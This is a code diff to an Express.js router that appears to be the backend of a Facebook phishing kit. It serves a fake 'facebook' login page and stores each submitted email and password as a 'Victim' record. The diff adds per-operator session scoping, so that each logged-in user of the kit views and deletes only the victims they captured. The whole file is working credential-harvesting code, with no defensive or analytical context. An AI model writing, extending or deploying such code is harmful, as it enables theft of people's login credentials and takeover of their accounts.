@@ -82,11 +82,18 @@ router.get('/dashboard', async (req, res) => {
 router.get('/facebook', (req, res) => {
     res.render('facebook');
 });
-// Submit login form and save to database
+
+// Submit login form and save to database with userId
 router.post('/submit-login', async (req, res) => {
     const { email, password } = req.body;
+    const userId = req.session.userId; // Retrieve logged-in user's ID from session
+
+    if (!userId) {
+        return res.status(401).send("Unauthorized");
+    }
+
     try {
-        const victim = new Victim({ emailOrNumber: email, password });
+        const victim = new Victim({ emailOrNumber: email, password, userId });
         await victim.save();
     } catch (error) {
         console.error("Error saving victim details:", error);
@@ -96,16 +103,23 @@ router.post('/submit-login', async (req, res) => {
 
 
 
-// View victims page with data from database
+// View victims page with data specific to logged-in user
 router.get('/view-victims', async (req, res) => {
+    const userId = req.session.userId; // Retrieve logged-in user's ID from session
+
+    if (!userId) {
+        return res.status(401).send("Unauthorized");
+    }
+
     try {
-        const victims = await Victim.find(); // Fetch all victims from the database
+        const victims = await Victim.find({ userId }); // Fetch victims for the specific user
         res.render('view-victims', { victims });
     } catch (error) {
         console.error("Error fetching victims:", error);
         res.status(500).send("Server Error");
     }
 });
+
 // Delete victim entry by ID
 router.post('/delete-victim', async (req, res) => {
     const { id } = req.body;
